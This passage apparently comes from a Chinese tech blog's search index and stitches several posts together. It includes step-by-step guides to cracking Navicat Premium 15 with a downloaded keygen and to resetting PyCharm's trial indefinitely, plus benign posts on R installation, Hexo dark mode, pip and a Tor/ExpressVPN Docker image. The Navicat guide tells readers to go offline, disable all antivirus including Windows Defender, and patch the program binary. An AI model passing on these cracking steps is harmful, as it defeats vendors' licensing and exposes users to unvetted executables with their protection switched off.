Windows 系统下 Navicat Premium 15 永久破解的教程，亲测永久破解有效！Navicat Premium 是 MySQL、MongoDB、SQL Server、Oracle 和 PostgreSQL 的一体化数据库管理工具，功能非常强大。 准备工作软件版本说明建议 Navicat Premium 15 软件和注册机软件都直接从本站下载，当前本站提供下载的 Navicat Premium 版本是 15.0.26，配套的注册机软件版本是 v5.6，两者都是经过亲测可以永久破解的。这是因为随着时间的推移，从官网下载的最新版 Navicat Premium 15，并不能保证能被 v5.6 版本的注册机永久破解。 下载注册机软件 本站下载地址（推荐）：点击下载 百度网盘地址：点击下载&nbsp; 提取码: mzgp 下载 Navicat Premium 15 软件 官网下载地址：点击下载 本站下载地址（推荐）：点击下载 Navicat Premium 15 破解注意事项 运行注册机软件之前，必须保证断网 运行注册机软件之前，必须关闭所有杀毒软件，包括 360 杀毒、腾讯管家、Windows Defender 等 Navicat Premium 15 安装完成后，不要运行 Navicat 软件，而是直接先运行注册机软件 运行注册机软件时，请选择 Navicat 的版本为 Navicat v15 安装 Navicat Premium 15Navicat Premium 15 下载好后直接安装，此安装步骤比较简单，选择安装位置后全部点击下一步 按钮即可 特别注意： Navicat Premium 15 安装完成后，不要运行 Navicat 软件 破解 Navicat Premium 15第一步破解 Navicat Premium 15 之前，必须保证断网，同时必须关闭所有杀毒软件，例如 360 杀毒、腾讯管家、Windows Defender 等 第二步以管理员身份运行注册机软件，勾选 Backup、Host 和 Navicat v15，然后点击 Patch 按钮，找到 Navicat Premium 15 安装目录下的 navicat.exe，选中并点击打开，Patch 成功后会提示 navicat.exe - x64 -&gt; Cracked，表示 Navicat Premium 15 已被破解 提示：如果 Navicat 安装在默认位置，点击 Patch 按钮后，会直接提示 navicat.exe - x64 -&gt; Cracked，而不再弹窗让你选择特定安装目录下的 navicat.exe 第三步Licenses 项选择 Enterprise，Products 项选择 Premium，Languages 项选择 Simplified Chinese，Resale License 项选择 Site License，然后点击 Generate 按钮，生成许可证密钥 (adsbygoogle = window.adsbygoogle || []).push({}); 第四步运行 Navicat Premium 15 软件，点击 注册 按钮，或者在主界面的菜单栏导航到：帮助 -&gt; 注册 粘贴上一步生成的许可证密钥到 Navicat Premium 15 的许可证密钥输入框，然后点击 激活 按钮 紧接着点击 手动激活 按钮 点击 手动激活 按钮后，显示的界面如下，该界面会显示 Navicat Premium 15 的 请求码 第五步将上一步 Navicat Premium 15 生成的 请求码 粘贴到注册机软件的 Request Code 输入框中，然后点击 Generate 按钮，生成激活码 最后将注册机软件生成的激活码粘贴到 Navicat Premium 15 的激活码输入框，然后点击 激活 按钮 成功激活后的提示界面如下 也可以在 Navicat Premium 15 主界面的菜单栏导航到：帮助 -&gt; 注册 来查看是否成功激活 常见问题破解失败若破解失败，首先卸载 Navicat Premium 15 软件，然后清理注册表并重启系统，最后再尝试重新安装并破解 Navicat 软件 参考博客 Navicat 的 Linux 版破解工具 Linux 安装 Navicat Premium 15 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"Centos 7 安装 R 语言",url:"/posts/a4ef22cd.html",text:'前言 R 官网下载 RStudio 官网下载 RPM 安装 R因为 R 已经由 EPEL 仓库管理，所以使用以下命令安装 R 12345678# 安装EPEL# yum install epel-release# 安装R# yum install R# 查看R的版本# R --version RPM 安装 RStudio从 官网下载 RStudio Desktop 或者 RStudio Server 的 RPM 安装包，然后直接使用以下 RPM 命令安装即可 1# rpm -ivh rstudio-1.4.1106-x86_64.rpm 验证 R 的安装创建 /usr/local/R/demo.R 源文件，写入以下代码 12345x &lt;- c(1,2,5,7,9)y &lt;- c(2,4,7,8,10)plot(x,y)abline(lm(y~x))title("回归图表") 在 R 的交互终端执行以下命令，运行上述的代码，若可以正常显示 回归图表，则说明 R 安装成功 123$ R&gt; setwd("/usr/local/R/")&gt; source("demo.R") R 安装 Package12$ R&gt; install.packages("httr") var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Hexo Next 8.x 主题添加可切换的暗黑模式",url:"/posts/abf4aee1.html",text:"前言Next 8.x 原生的暗黑模式Next 8.x 主题已经原生支持暗黑模式，只需要在 Next 的 _config.yml 配置文件中，将相应的开关打开即可（如下所示）： 1darkmode: true Next 8.x 主题原生暗黑模式的优缺点： 优点： 配置非常简单 缺点： 缺少切换按钮，默认是根据系统偏好（系统是否处于暗黑模式）来决定是否启用 Next 7.x 自动添加可切换的暗黑模式若读者使用的 Next 版本是 7.x，建议直接安装 hexo-next-darkmode 插件来自动添加可切换的暗黑模式，具体的安装步骤与下面讲述的教程： Next 8.x 自动添加可切换的暗黑模式 一致。 Next 8.x 自动添加可切换的暗黑模式hexo-next-darkmode 插件支持自动添加可切换的暗黑模式，同时支持暗黑模式下的 CSS 样式高度自定义，包括自定义代码块颜色切换等，兼容 Next 7.x 与 8.x 版本，最终演示效果可以看这里。 安装 Hexo 插件安装 hexo-next-darkmode 插件 1$ npm install hexo-next-darkmode --save 配置 Hexo 插件在 Next 主题的 _config.yml 配置文件里添加以下内容 1234567891011121314151617# Darkmode JS# For more information: https://github.com/rqh656418510/hexo-next-darkmode, https://github.com/sandoche/Darkmode.jsdarkmode_js: enable: true bottom: '64px' # default: '32px' right: 'unset' # default: '32px' left: '32px' # default: 'unset' time: '0.5s' # default: '0.3s' mixColor: 'transparent' # default: '#fff' backgroundColor: 'transparent' # default: '#fff' buttonColorDark: '#100f2c' # default: '#100f2c' buttonColorLight: '#fff' # default: '#fff' isActivated: false # default false saveInCookies: true # default: true label: '🌓' # default: '' autoMatchOsTheme: true # default: true libUrl: # Set custom library cdn url for Darkmode.js isActivated: true：默认激活暗黑 / 夜间模式，请始终与 saveInCookies: false、autoMatchOsTheme: false 一起使用 关闭原生的暗黑模式确保 Next 原生的 darkmode 选项设置为 false，在 Next 的 _config.yml 配置文件中更改以下内容： 1darkmode: false 暗黑模式 CSS 样式自定义（可选）暗黑模式激活后，hexo-next-darkmode 插件会将 darkmode--activated CSS 类添加到 body 标签，可以利用它覆盖插件默认自带的 CSS 样式（如下所示）；这样就可以实现暗黑模式 CSS 样式的高度自定义，包括代码块颜色自定义切换等。更多配置内容介绍可以参考官方文档，实现原理分析可以看这里。 12345678910111213141516171819202122232425262728293031323334353637.darkmode--activated { --body-bg-color: #282828; --content-bg-color: #333; --card-bg-color: #555; --text-color: #ccc; --blockquote-color: #bbb; --link-color: #ccc; --link-hover-color: #eee; --brand-color: #ddd; --brand-hover-color: #ddd; --table-row-odd-bg-color: #282828; --table-row-hover-bg-color: #363636; --menu-item-bg-color: #555; --btn-default-bg: #222; --btn-default-color: #ccc; --btn-default-border-color: #555; --btn-default-hover-bg: #666; --btn-default-hover-color: #ccc; --btn-default-hover-border-color: #666; --highlight-background: #282b2e; --highlight-foreground: #a9b7c6; --highlight-gutter-background: #34393d; --highlight-gutter-foreground: #9ca9b6;}.darkmode--activated img { opacity: 0.75;}.darkmode--activated img:hover { opacity: 0.9;}.darkmode--activated code { color: #69dbdc; background: transparent;} 重新构建生成静态文件Hexo 重新构建生成静态文件后，点击页面上的按钮即可切换暗黑模式，最终演示效果可以看这里。 123$ hexo clean$ hexo g -d (adsbygoogle = window.adsbygoogle || []).push({}); Next 8.x 手动添加可切换的暗黑模式关闭原生的暗黑模式确保 Next 原生的 darkmode 选项设置为 false，在 Next 的 _config.yml 配置文件中更改以下内容： 1darkmode: false 添加 JS 库 Darkmode.js下载 darkmode.js 或者直接添加 CDN 配置到 Next 的 themes/next/_vendors.yml 文件末尾，这里采用 CDN 配置的方式（如下所示） 1234darkmode_js: name: darkmode-js version: 1.5.7 file: lib/darkmode-js.min.js 添加 Darkmode.js 的启用开关在 Next 的 _config.yml 配置文件添加以下内容，值得一提的是，这里需要注意缩进，第一个 darkmode_js 是在 vendors 栏目下，第二个 darkmode_js 是一个单独的栏目 123456vendors: # Darkmode.js darkmode_js:darkmode_js: enable: true 配置 JS 库 Darkmode.js编辑 themes/next/layout/_scripts/vendors.njk 文件，将原有的代码删除掉，替换为以下代码即可： 123456789101112131415161718192021222324252627282930313233{%- if theme.canvas_ribbon.enable %} &lt;script size=\"{{ theme.canvas_ribbon.size }}\" alpha=\"{{ theme.canvas_ribbon.alpha }}\" zIndex=\"{{ theme.canvas_ribbon.zIndex }}\" src=\"{{ theme.vendors.canvas_ribbon }}\"&gt;&lt;/script&gt;{%- endif %}{# Customize darkmode.js - Declaration #}{%- if theme.darkmode_js.enable %} &lt;script src=\"{{ theme.vendors.darkmode_js }}\"&gt;&lt;/script&gt;{%- endif %}{%- for name in js_vendors() %} &lt;script src=\"{{ url_for(theme.vendors[name]) }}\"&gt;&lt;/script&gt;{%- endfor %}{# Customize darkmode.js - Invokation #}{%- if theme.darkmode_js.enable %}&lt;script&gt;var options = { bottom: '64px', // default: '32px' right: 'unset', // default: '32px' left: '32px', // default: 'unset' time: '0.5s', // default: '0.3s' mixColor: '#fff', // default: '#fff' backgroundColor: '#fff', // default: '#fff' buttonColorDark: '#100f2c', // default: '#100f2c' buttonColorLight: '#fff', // default: '#fff' saveInCookies: true, // default: true, label: '🌓', // default: '' autoMatchOsTheme: true // default: true}const darkmode = new Darkmode(options);darkmode.showWidget();&lt;/script&gt;{%- endif %} 更改后的源文件就如上所示，其他内容可以根据实际情况自行更改。添加上面的代码后，暗黑模式的切换按钮默认显示在左下角，如果希望切换按钮显示在右下角，可以参考以下代码： 1234567891011121314151617181920{# Customize darkmode.js - Invokation #}{%- if theme.darkmode_js.enable %}&lt;script&gt;var options = { bottom: '64px', // default: '32px' right: '32px', // default: '32px' left: 'unset', // default: 'unset' time: '0.5s', // default: '0.3s' mixColor: '#fff', // default: '#fff' backgroundColor: '#fff', // default: '#fff' buttonColorDark: '#100f2c', // default: '#100f2c' buttonColorLight: '#fff', // default: '#fff' saveInCookies: true, // default: true, label: '🌓', // default: '' autoMatchOsTheme: false // default: true}const darkmode = new Darkmode(options);darkmode.showWidget();&lt;/script&gt;{%- endif %} 暗黑模式 CSS 样式自定义实现原理分析从 Next 8.0 开始，已经原生支持代码块 Dark 主题，直接在 Next 的 _config.xml 文件里配置即可（如下所示）： 123456789codeblock: # Code Highlight theme # All available themes: https://theme-next.js.org/highlight/ theme: light: atelier-forest-light dark: androidstudio prism: light: prism dark: prism-atom-dark 其中 Next 8.3 源文件 themes/next/source/css/_colors.styl 的内容如下所示： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465:root { --body-bg-color: $body-bg-color; --content-bg-color: $content-bg-color; --card-bg-color: $card-bg-color; --text-color: $text-color; --blockquote-color: $blockquote-color; --link-color: $link-color; --link-hover-color: $link-hover-color; --brand-color: $brand-color; --brand-hover-color: $brand-hover-color; --table-row-odd-bg-color: $table-row-odd-bg-color; --table-row-hover-bg-color: $table-row-hover-bg-color; --menu-item-bg-color: $menu-item-bg-color; --btn-default-bg: $btn-default-bg; --btn-default-color: $btn-default-color; --btn-default-border-color: $btn-default-border-color; --btn-default-hover-bg: $btn-default-hover-bg; --btn-default-hover-color: $btn-default-hover-color; --btn-default-hover-border-color: $btn-default-hover-border-color; --highlight-background: $highlight-background; --highlight-foreground: $highlight-foreground; --highlight-gutter-background: $highlight-gutter-background; --highlight-gutter-foreground: $highlight-gutter-foreground;}if (hexo-config('darkmode')) { @media (prefers-color-scheme: dark) { :root { --body-bg-color: $body-bg-color-dark; --content-bg-color: $content-bg-color-dark; --card-bg-color: $card-bg-color-dark; --text-color: $text-color-dark; --blockquote-color: $blockquote-color-dark; --link-color: $link-color-dark; --link-hover-color: $link-hover-color-dark; --brand-color: $brand-color-dark; --brand-hover-color: $brand-hover-color-dark; --table-row-odd-bg-color: $table-row-odd-bg-color-dark; --table-row-hover-bg-color: $table-row-hover-bg-color-dark; --menu-item-bg-color: $menu-item-bg-color-dark; --btn-default-bg: $btn-default-bg-dark; --btn-default-color: $btn-default-color-dark; --btn-default-border-color: $btn-default-border-color-dark; --btn-default-hover-bg: $btn-default-hover-bg-dark; --btn-default-hover-color: $btn-default-hover-color-dark; --btn-default-hover-border-color: $btn-default-hover-border-color-dark; --highlight-background: $highlight-background-dark; --highlight-foreground: $highlight-foreground-dark; --highlight-gutter-background: $highlight-gutter-background-dark; --highlight-gutter-foreground: $highlight-gutter-foreground-dark; } img { opacity: .75; &amp;:hover { opacity: .9; } } }} 暗黑模式激活后，Darkmode.js 默认会将 darkmode--activated CSS 类添加到 body 标签，可以利用它覆盖暗黑模式默认的 CSS 样式。换句话说，只要将上面的 themes/next/source/css/_colors.styl 里的 CSS 样式添加到 darkmode--activated CSS 类的下面，就可以实现暗黑模式的 CSS 样式自定义，包括代码块颜色自定义切换等。 实现步骤介绍 第一步：创建 themes/next/source/css/_custom/darkmode.styl 源文件，并将以下内容写入到文件里，code 样式用于控制暗黑模式下的代码块颜色显示 12345678910111213141516171819202122232425262728293031323334353637383940.darkmode--activated{ --body-bg-color: $body-bg-color-dark; --content-bg-color: $content-bg-color-dark; --card-bg-color: $card-bg-color-dark; --text-color: $text-color-dark; --blockquote-color: $blockquote-color-dark; --link-color: $link-color-dark; --link-hover-color: $link-hover-color-dark; --brand-color: $brand-color-dark; --brand-hover-color: $brand-hover-color-dark; --table-row-odd-bg-color: $table-row-odd-bg-color-dark; --table-row-hover-bg-color: $table-row-hover-bg-color-dark; --menu-item-bg-color: $menu-item-bg-color-dark; --btn-default-bg: $btn-default-bg-dark; --btn-default-color: $btn-default-color-dark; --btn-default-border-color: $btn-default-border-color-dark; --btn-default-hover-bg: $btn-default-hover-bg-dark; --btn-default-hover-color: $btn-default-hover-color-dark; --btn-default-hover-border-color: $btn-default-hover-border-color-dark; --highlight-background: $highlight-background-dark; --highlight-foreground: $highlight-foreground-dark; --highlight-gutter-background: $highlight-gutter-background-dark; --highlight-gutter-foreground: $highlight-gutter-foreground-dark; img { opacity: .75; &amp;:hover { opacity: .9; } } code { color: #69dbdc; background: transparent; }} 若添加上述 CSS 样式后，暗黑模式的切换按钮点击无效，那么可以尝试追加以下样式来解决 123button.darkmode-toggle { z-index: 9999;} 第二步：在 themes/next/source/css/main.styl 文件里引入上面创建的 CSS 文件即可 1@import '_custom/darkmode.styl'; 第三步：在 themes/next/layout/_scripts/vendors.njk 里更改 Darkmode.js 的颜色配置（如下所示），其中主要设置 mixColor: 'transparent' 与 backgroundColor: 'transparent'，否则自定义的暗黑模式 CSS 样式无法达到预期的显示效果 12345678910111213141516171819202122232425{# Customize darkmode.js - Declaration #}{%- if theme.darkmode_js.enable %} &lt;script src=\"{{ theme.vendors.darkmode_js }}\"&gt;&lt;/script&gt;{%- endif %}{# Customize darkmode.js - Invokation #}{%- if theme.darkmode_js.enable %}&lt;script&gt;var options = { bottom: '64px', // default: '32px' right: 'unset', // default: '32px' left: '32px', // default: 'unset' time: '0.5s', // default: '0.3s' mixColor: 'transparent', // default: '#fff' backgroundColor: 'transparent', // default: '#fff' buttonColorDark: '#100f2c', // default: '#100f2c' buttonColorLight: '#fff', // default: '#fff' saveInCookies: true, // default: true, label: '🌓', // default: '' autoMatchOsTheme: true // default: true}const darkmode = new Darkmode(options);darkmode.showWidget();&lt;/script&gt;{%- endif %} 重新构建生成静态文件Hexo 重新构建生成静态文件后，点击页面上的按钮即可切换暗黑模式 123$ hexo clean$ hexo g -d 支持评论系统的暗黑模式Waline 评论系统 Waline 评论系统启用暗黑模式 最终演示效果 常见问题Darkmode.js 详细配置 Darkmode Github Chrome 无法正常显示切换按钮的图标默认的切换按钮图标 label: '🌓' 是 Emoji 表情字符，部分浏览器（如 Chrome）可能会显示为一个方块。解决方法是访问 Chrome 网上应用商店，手动安装 Chromoji 浏览器插件，即可让 Chrome 正常显示 Emoji 表情字符。请确保可以科学上网，否则无法正常访问 Chrome 的网上应用商店。若此方法依旧无法解决该问题，请参考下方评论区中网友 busyops 给出的解决方案，或在评论区留言，笔者会及时回复你。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"静态博客"},{title:"MyBatis 开发随笔",url:"/posts/ed9df8e6.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 开发随笔 数据库"},{title:"PyCharm 2021.1 最新专业版激活教程",url:"/posts/cfba1e15.html",text:'前言本文适用于 PyCharm 2021.1 最新专业版的激活，由于 PyCharm 更新到 2021.1 版本后，之前所有的激活方式好像都失效了，所以今天介绍下最新的激活方式。该激活方法适用于 Jetbrains 全家桶任何版本，即使是从官网下载的最新版本，亲测可成功激活。 资源下载 Python 官网下载 PyCharm 官网下载 Jetbrains 激活插件下载（本站） PyCharm 激活更改 Hosts 文件更改 hosts 文件，将 hosts 文件中有关 Jetbrains 的配置行全部删除掉，若没有则请忽略此步骤。Windows 系统的 hosts 文件路径为：C:\\Windows\\System32\\drivers\\etc\\hosts，Linux 和 Mac 系统的 hosts 文件路径为：/etc/hosts，一般情况下只需删除以下两行内容即可： 120.0.0.0 www.jetbrains.com0.0.0.0 account.jetbrains.com PyCharm 安装与试用下载安装 PyCharm，然后启动 PyCharm 并选择试⽤（Evaluate for free）模式进⼊软件（如下图）。假设软件之前激活过且已失效、正在试用、试用过且已过期，那么必须先删除 PyCharm 的所有配置文件，然后再重新启动软件，PyCharm 配置文件所在的目录如下： 1234567# Windows系统C:\\Documents and Settings\\Administrator\\.PyCharm2021.1\\configC:\\Documents and Settings\\Administrator\\.PyCharm2021.1\\system# Linux/Mac系统~/.config/JetBrains/PyCharm2021.1~/.local/share/JetBrains/PyCharm2021.1 PyCharm 创建或选择项目选择创建项目或者打开已存在的项目 选择好项目路径和 Python 解释器后，点击 create 按钮后，进入 Pycharm 的主界面 (adsbygoogle = window.adsbygoogle || []).push({}); PyCharm 激活这里的激活方式就是通过激活插件，让 PyCharm 可以一直试用，本质是重置 PyCharm，最终达到无限次试用 30 天的效果。值得一提的是，此激活方法会彻底重置 PyCharm，任何配置信息都将丢失，和新安装的时候一样。 离线激活方式首先手动下载好 PyCharm 的激活插件，然后启动 PyCharm 后，菜单栏导航到 file -&gt; settings -&gt; Plugins，依次点击 齿轮 -&gt; Install Plugin from Disk...，找到激活插件所在目录，选中本地激活文件 ide-eval-resetter-2.1.13.zip，最后点击 OK 按钮即可 在线激活方式启动 PyCharm 后，菜单栏导航到 file -&gt; settings -&gt; Plugins，依次点击 齿轮 -&gt; Manage Plugin Repositories...，点击 + 添加仓库 URL https://plugins.zhile.io，然后点击 OK 按钮 点击 Plugins -&gt; Maketplace，搜索 IDE Eval Reset 插件，然后点击 Install 按钮进行安装，如果搜索不到对应的插件，请检查网络是否通畅 PyCharm 激活插件配置一般来说，在 IDE 窗口切出去或切回来时（窗口失去 / 得到焦点）会触发事件，检测是否长时间（2 5 天）内没有重置，然后发送通知让你选择重置。也可以手动唤出激活插件的主界面，打开 PyCharm 的主界面，菜单栏导航到 Help -&gt; Eval Reset，弹出如下提示框，其中包括 2 个按钮，1 个勾选项： Reload 按钮：用来刷新界面上的显示信息 Reset 按钮：点击会询问是否重置试用信息并重启 IDE。选择 Yes 则执行重置操作并重启 IDE 生效，选择 No 则什么也不做（此为手动重置方式） Auto reset before per restart 勾选项：如果勾选了，则自勾选后每次重启 / 退出 IDE 时会自动重置试用信息，无需做额外的事情（此为自动重置方式） 常见问题Pycharm 无限重启如果 Pycharm 无限重启，说明之前的激活插件（例如 BetterInterlliJ）没有卸载，请卸载干净再重新激活 PyCharm 激活失败如果之前在 hosts 中添加过 0.0.0.0 account.JetBrains.com 和 0.0.0.0 www.JetBrains.com，请删除掉对应的内容再重新激活 如何更新激活插件 IDE 会自行检测其自身和所安装插件的更新并给予提示，如果本插件有更新，你会收到提示看到更新日志，自行选择是否更新 菜单栏导航到 Check for Updates...，手动检测 IDE 和所安装插件的更新，如果本插件有更新，你会收到提示看到更新日志，自行选择是否更新 插件更新可能会需要重启 IDE 付费插件重置说明市场上付费插件的试用信息也会一并重置，MyBatisCodeHelperPro 插件有两个版本如下，功能完全相同，安装时须看清楚： MyBatisCodeHelperPro (Marketplace Edition)，可重置！ MyBatisCodeHelperPro，不可重置！ 对于某些付费插件（如: Iedis 2, MinBatis）来说，可能需要去除掉 javaagent 配置（如果有）后再重启 IDE： 如果 IDE 没有打开项目，在 Welcome 界面点击菜单： Configure -&gt; Edit Custom VM Options... -&gt; 移除 -javaagent: 开头的内容 如果 IDE 打开了项目，点击菜单：Help -&gt; Edit Custom VM Options... -&gt; 移除 -javaagent: 开头的内容 重置需要重启 IDE 才生效 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"构建 Hexo Next 主题的源码",url:"/posts/63112f7b.html",text:'核心源文件布局模板文件 /themes/next/layout/_layout.njk /themes/next/layout/_macro/post.njk 更改 Next 主题的源码NJK 模版文件判断是否为首页1{%- if is_index %} ... {%- endif %} 1{%- if not is_index %} ... {%- endif %} 引入自定义的 NJK 模版文件默认以 /theme/next/layout 为根目录，不需要使用 ../ 符号来引用上级目录中的模版文件 1{{ partial(\'_partials/_custom/adsense/post-footer-ads.njk\') }} 下述这种引入方式只能引入当前目录下（包括子目录）的模版文件，无法使用 ../ 符号来引用上级目录中的模版文件 1{%- include \'_custom/adsense/post-footer-ads.njk\' -%} NJK 模版文件获取 Hexo 的配置信息获取 Hexo 的配置文件 _config.yml 的内容： 1{%- if config.excerpt_description %} ... {%- endif %} 或者 123456&lt;div style="text-align:center"&gt; &lt;ins class="ads" style="display:block" data-ad-client="{{ config.adsense.publisher_id }}" data-full-width-responsive="true"&gt;&lt;/ins&gt;&lt;/div&gt; NJK 模版文件获取 Next 的配置信息获取 Next 主题的配置文件 /theme/next/_config.yml 的内容： 1{%- if theme.excerpt_description %} ... {%- endif %} 或者 123456&lt;div style="text-align:center"&gt; &lt;ins class="ads" style="display:block" data-ad-client="{{ theme.adsense.publisher_id }}" data-full-width-responsive="true"&gt;&lt;/ins&gt;&lt;/div&gt; NJK 模版文件获取文章的 Meta 信息1{%- if post.description and theme.excerpt_description %} ... {%- endif %} 覆盖 Next 默认的 CSS 样式123.vpreview p { color: #444 !important;} 取消 Next 默认的 CSS 样式123.comments { overflow: unset;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客"},{title:"Python 常用命令",url:"/posts/1e59ef45.html",text:'Pip 管理模块单个更新模块12345678# 列出所有已安装的模块# pip list# 列出所有过期的模块# pip list --outdated# 更新指定的模块# pip install --upgrade requests 批量更新模块12345# 安装更新工具# pip install pip-review# 批量更新模块# pip-review --local --interactive --auto 批量卸载模块12345# 列出所有已安装的模块# pip freeze &gt; py.txt# 卸载所有已安装的模块# pip uninstall -y -r py.txt var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"python"},{title:"构建 Privoxy、Tor、ExpressVPN 的 Docker 镜像",url:"/posts/3fe8dbc5.html",text:'前言教程目标构建集成了 Privoxy、Tor、ExpressVPN、SpeedTest 服务的 Docker 镜像，支持使用 SpeedTest 测试 ExpressVPN 的连接速度。Docker 镜像构建成功后，可以利用 Privoxy 与 Tor 在 ExpressVPN 的基础上，实现普通代理与匿名代理服务。 项目地址 expressvpn-privoxy-tor 构建镜像Dockerfile 文件Dockerfile 文件的内容如下，核心内容是安装 Privoxy、Tor、ExpressVPN、SpeedTest，并指定 Privoxy 与 Tor 的监听端口 1234567891011121314151617181920212223242526272829FROM debian:bullseye-slimLABEL maintainer="benjamin@polkaned.net"ENV ACTIVATION_CODE CodeENV LOCATION smartARG APP=expressvpn_3.18.1.0-1_amd64.debRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\ wget curl apt-utils apt-transport-https dirmngr ca-certificates expect iproute2 procps libnm0 gnupg2 tor privoxy \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; wget -q "https://www.expressvpn.works/clients/linux/${APP}" -O /tmp/${APP} \\ &amp;&amp; dpkg -i /tmp/${APP} \\ &amp;&amp; rm -rf /tmp/*.deb \\ &amp;&amp; apt-get purge -y --auto-remove wget \\ &amp;&amp; sed -i \\ -e \'s/#SocksPort 192.168.0.1:9100/SocksPort 0.0.0.0:9050/g\' \\ -e \'s/#ControlPort 9051/ControlPort 9052/g\' \\ /etc/tor/torrc \\ &amp;&amp; sed -i \\ -e \'s/listen-address\\s*127.0.0.1:8118/listen-address 0.0.0.0:8118/g\' \\ /etc/privoxy/config \\ &amp;&amp; curl -s https://install.speedtest.net/app/cli/install.deb.sh | bash \\ &amp;&amp; apt-get install speedtestCOPY entrypoint.sh /tmp/entrypoint.shCOPY expressvpnActivate.sh /tmp/expressvpnActivate.shENTRYPOINT ["/bin/bash", "/tmp/entrypoint.sh"] Shell 脚本文件entrypoint.sh 文件的内容如下： 12345678910111213#!/usr/bin/bashservice tor startservice privoxy startcp /etc/resolv.conf /tmp/resolv.confsu -c \'umount /etc/resolv.conf\'cp /tmp/resolv.conf /etc/resolv.confsed -i \'s/DAEMON_ARGS=.*/DAEMON_ARGS=""/\' /etc/init.d/expressvpnservice expressvpn restart/usr/bin/expect /tmp/expressvpnActivate.shexpressvpn connect $SERVERexec "$@" expressvpnActivate.sh 文件的内容如下： 1234567#!/usr/bin/expectspawn expressvpn activateexpect "code:"send "$env(ACTIVATION_CODE)\\r"expect "information."send "n\\r"expect eof 构建 Docker 镜像由于这里需要从官网下载 ExpressVPN 的安装包，因此构建 Docker 镜像时，必须保证可以科学上网，否则无法正常构建镜像。温馨提示，若无法提供科学上网的条件，可参考这里的方案来解决。 1# docker build --pull --no-cache --rm --force-rm -f Dockerfile -t polkaned/privoxy-tor-expressvpn:latest . 运行容器Docker 运行容器 {% your-activation-code %}：ExpressVPN 的激活码，例如 ACTIVATION_CODE=ABCD1EBGH2IJAL3MNOP4QRS {% LOCATION/ALIAS/COUNTRY %}：ExpressVPN 的连接位置，例如 SERVER=jpyo，若为空值则默认使用 ExpressVPN 的智能位置 1234567891011121314docker run \\ --env=ACTIVATION_CODE={% your-activation-code %} \\ --env=SERVER={% LOCATION/ALIAS/COUNTRY %} \\ --cap-add=NET_ADMIN \\ --device=/dev/net/tun \\ --privileged \\ --detach=true \\ --tty=true \\ -p 9050:9050 \\ -p 9052:9052 \\ -p 8118:8118 \\ --name=expressvpn \\ 